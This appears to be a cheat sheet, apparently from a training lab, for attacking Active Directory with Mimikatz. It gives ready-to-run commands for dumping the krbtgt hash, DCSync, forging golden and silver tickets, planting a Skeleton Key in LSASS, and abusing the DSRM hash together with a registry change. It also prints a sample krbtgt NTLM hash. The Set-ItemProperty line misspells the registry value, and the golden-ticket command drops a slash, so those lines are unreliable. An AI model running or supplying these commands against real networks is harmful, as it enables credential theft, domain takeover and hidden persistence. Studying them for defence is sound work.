**Golden Ticket:**


Once we get inside DC with the privileges of Domain Administrator, we can execute following command to get krbtgt hash:
```Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC_computer>```

Once we get the hash of krbtgt account, we can generate our own TGT using:
```Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<sid> /krbtgt:<krbtgt_hash> id:<id> /groups:<group_id_optional> /startoffset:0 /endin:600 /renewmax:10080 /ptt"'```

> Found the following creds of krbtgt:


> RID  : 000001f6 (502)


> User : krbtgt


> LM   :


> NTLM : ff46a9d8bd66c6efd77603da26796f35


To see currently stored tickets:
``` klist```


**DCSync**


```Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<username>"'```
Example: ```Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'```



**Silver Ticket:**


Golden ticket creates a TGT using krbtgt's hash, but Silver ticket attack creates a TGS using the hash of the service to be approached.

```Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain_name> /sid:<sid> /target:<target_host_where_service_is_being_used> /service:<service_name> /rc4:<password_hash_for_machine_account> /user:<username> /ptt"'```


**Skeleton Key:**


Using skeleton key malware(attack/technique), the script modifies the LSASS(which handles the security and auth stuff in AD) gets modified and a secret key/password is made valid for every account other than their original password.
That secret key can be used to access any account.

```Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <domain_name>```

Note: This, by default sets the secret key/password as "mimikatz". But the above "patching" can only be performed once. To do it again, the DC needs to be restarted. Also, this gives us persistence to some extent but not for much long time.
As soon as the DC restarts, the skeleton key is removed.



**DSRM(Directory Service Restore Mode):**


When a computer is promoted to Domain Controller, a DSRM password is set which is the local admin password of that computer.
It can be extracted using:

Note: Domain admin privs are required

```Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <domain_controller>```

After obtaining the DSRM hash:

```Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<DC-computer> /user:Administrator /ntlm:<dsrm_hash> /run:powershell.exe"'```

Before using the above command to use DSRM hash, first we need to change a registry key for changing the logon behaviour of DSRM. For that, just get inside DC as DA, and execute the following powershell command:

```New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD```

Sometime, you will see an error that this propery already exists. That means you don't need to create a new property using "New-ItemProperty" but you have to use "Set-ItemProperty" to change the value of that property:

```Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2```

